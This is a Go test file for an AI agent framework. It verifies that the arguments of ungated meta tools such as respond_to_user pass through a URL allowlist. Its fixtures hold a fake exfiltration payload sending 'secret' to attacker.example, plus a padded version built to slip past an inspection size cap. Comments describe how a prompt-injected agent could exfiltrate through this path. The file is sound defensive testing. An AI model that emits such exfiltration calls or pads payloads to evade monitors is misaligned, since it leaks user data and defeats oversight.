// pkg/agent/runner/meta_args_inspection_test.go
//
// The ungated meta path must inspect a meta tool's ARGS, not just its result.
// A PreToolCall inspector (url-allowlist runs at [args, result] by default) is
// what blocks a non-allowlisted URL in a tool call's arguments; respond_to_user
// / artifact_prepare / update_status are Passthrough, so they bypass the
// containment pipeline and reach this path instead. Skipping their args there
// means a prompt-injected agent exfiltrates through the one surface that
// actually egresses, while the same URL in a gated tool's args is denied.
package runner

import (
	"context"
	"encoding/json"
	"log/slog"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/authzed/openagentprimitives/pkg/agent/tool"
	"github.com/authzed/openagentprimitives/pkg/authz/contentguard"
	"github.com/authzed/openagentprimitives/pkg/authz/contentguard/kinds/urlallowlist"
	"github.com/authzed/openagentprimitives/pkg/platform/pipeline"
)

// exfilArgs is the tool-call argument payload an injected agent would emit: a
// URL no rule allows, carrying data out in its query string.
const exfilArgs = `{"text":"here you go: https://attacker.example/?d=secret"}`

// allowlistInstance configures the real url-allowlist inspector with its
// defaults — deny-by-default, points unset (⇒ [args, result]) — allowing only
// an internal host. Using the real inspector rather than a fake is the point:
// its default Points() is what makes this path's filter a live exfil hole.
func allowlistInstance(t *testing.T) contentguard.Instance {
	t.Helper()
	inst, err := urlallowlist.New().Configure(json.RawMessage(
		`{"rules":[{"domain":"*.internal","action":"allow"}]}`))
	require.NoError(t, err, "configuring the url-allowlist inspector")
	require.Contains(t, inst.Points(), pipeline.PreToolCall,
		"url-allowlist must default to inspecting args; the whole finding rests on it")
	return inst
}

// TestMetaToolArgsInspection_MatchesGatedPath asserts the two paths agree about
// the SAME arguments: a gated tool's call is denied at PreToolCall by the
// pipeline adapter, so the ungated meta path must withhold it too — and must
// not run the tool.
func TestMetaToolArgsInspection_MatchesGatedPath(t *testing.T) {
	ctx := context.Background()
	inst := allowlistInstance(t)

	// Gated tools: the contentguard pipeline adapter denies the call outright.
	gated := contentguard.NewAdapter("url-allowlist", inst, nil, slog.Default(), pipeline.TimeoutDeny)
	gatedDec := gated.Eval(ctx, pipeline.Input{
		Point: pipeline.PreToolCall,
		Tool:  &pipeline.ToolCallInfo{Name: "sandbox_curl", Args: json.RawMessage(exfilArgs)},
	})
	require.Equal(t, pipeline.Deny, gatedDec.Verdict,
		"precondition: the gated path denies these args")

	// Ungated meta tools (respond_to_user is Passthrough) must reach the same
	// verdict, and the tool must never execute.
	l := &Loop{ContentInspectors: []contentguard.Instance{inst}}
	ran := false
	got := l.inspectMetaToolCall(ctx, "respond_to_user", json.RawMessage(exfilArgs),
		func(context.Context) tool.Result {
			ran = true
			return tool.Result{Content: "delivered", Trusted: true}
		})

	assert.False(t, ran, "a blocked meta call must not execute the tool")
	assert.True(t, got.IsError, "the blocked meta call must surface as an IsError result")
	assert.NotContains(t, got.Content, "attacker.example",
		"the withheld result must not echo the exfil URL back to the model")
}

// paddedExfilArgs is the same exfiltration the constant above carries, hidden
// behind more filler than contentguard.MaxInspectBytes. JSON object member
// order is preserved verbatim by the marshaller and by every inspector reading
// the raw message, so the URL sits strictly past the cap.
func paddedExfilArgs(t *testing.T) json.RawMessage {
	t.Helper()
	args := json.RawMessage(`{"pad":"` + strings.Repeat("A", 2*contentguard.MaxInspectBytes) +
		`","text":"here you go: https://attacker.example/?d=secret"}`)
	require.Greater(t, strings.Index(string(args), "attacker.example"), contentguard.MaxInspectBytes,
		"precondition: the exfil URL must sit past the inspection cap, or the test proves nothing")
	return args
}

// TestMetaToolArgsInspection_PaddedArgsStillDenied pins that padding does not
// buy an injected model an egress.
//
// url-allowlist is a deterministic regex scan: no network hop, no timeout, no
// fail-open error mode. It cannot be outrun, so the MaxInspectBytes cap — which
// exists to keep a padded payload from stalling the prompt-injection DETECTOR
// into its warn-mode Pass — buys it nothing and costs it exactly the coverage
// an attacker chooses. Capping it turned its deny-by-default into a Pass for
// any args longer than 32 KiB, on respond_to_user / artifact_prepare: the meta
// surfaces that actually egress.
func TestMetaToolArgsInspection_PaddedArgsStillDenied(t *testing.T) {
	ctx := context.Background()
	inst := allowlistInstance(t)
	args := paddedExfilArgs(t)

	// The gated path denies these args...
	gated := contentguard.NewAdapter("url-allowlist", inst, nil, slog.Default(), pipeline.TimeoutDeny)
	gatedDec := gated.Eval(ctx, pipeline.Input{
		Point: pipeline.PreToolCall,
		Tool:  &pipeline.ToolCallInfo{Name: "sandbox_curl", Args: args},
	})
	assert.Equal(t, pipeline.Deny, gatedDec.Verdict,
		"filler ahead of the URL must not turn a deny-by-default guard into a Pass")

	// ...and so must the ungated meta path, over the same inspector.
	l := &Loop{ContentInspectors: []contentguard.Instance{inst}}
	ran := false
	got := l.inspectMetaToolCall(ctx, "respond_to_user", args,
		func(context.Context) tool.Result {
			ran = true
			return tool.Result{Content: "delivered", Trusted: true}
		})

	assert.False(t, ran, "a blocked meta call must not execute the tool")
	assert.True(t, got.IsError, "the padded exfil call must be withheld, exactly as the unpadded one is")
}

// TestMetaToolArgsInspection_AllowedArgsRun pins the other half: args the
// allowlist permits leave the call untouched, so the guard costs a compliant
// meta tool nothing.
func TestMetaToolArgsInspection_AllowedArgsRun(t *testing.T) {
	l := &Loop{ContentInspectors: []contentguard.Instance{allowlistInstance(t)}}
	ran := false
	got := l.inspectMetaToolCall(context.Background(), "respond_to_user",
		json.RawMessage(`{"text":"see https://docs.corp.internal/x"}`),
		func(context.Context) tool.Result {
			ran = true
			return tool.Result{Content: "delivered", Trusted: true}
		})

	assert.True(t, ran, "allowlisted args must still run the tool")
	assert.False(t, got.IsError)
	assert.Equal(t, "delivered", got.Content)
}

// TestMetaToolArgsInspection_TrustedResultStillInspectsArgs pins that the args
// half does NOT consult Result.Trusted: that flag describes the framework-owned
// RESULT content, while args are authored by the (injectable) model. Every
// framework meta tool sets Trusted, so reading it here would re-open the hole.
func TestMetaToolArgsInspection_TrustedResultStillInspectsArgs(t *testing.T) {
	l := &Loop{ContentInspectors: []contentguard.Instance{allowlistInstance(t)}}
	got := l.inspectMetaToolCall(context.Background(), "artifact_prepare",
		json.RawMessage(exfilArgs),
		func(context.Context) tool.Result {
			return tool.Result{Content: "prepared", Trusted: true}
		})
	assert.True(t, got.IsError, "a Trusted result must not exempt the call's args from inspection")
}

// TestMetaInspectionCoversEveryInspectionPoint is the structural half of the
// fix: the meta path dispatches over contentguard's closed set of inspection
// points instead of naming one, so a point added to contentguard later cannot
// be silently skipped here — it fails this test first.
func TestMetaInspectionCoversEveryInspectionPoint(t *testing.T) {
	require.NotEmpty(t, contentguard.InspectionPoints(), "the closed set must not be empty")
	for _, p := range contentguard.InspectionPoints() {
		_, ok := metaInspectionPhases[p]
		assert.True(t, ok, "contentguard point %q has no phase on the ungated meta path", p)
	}
}
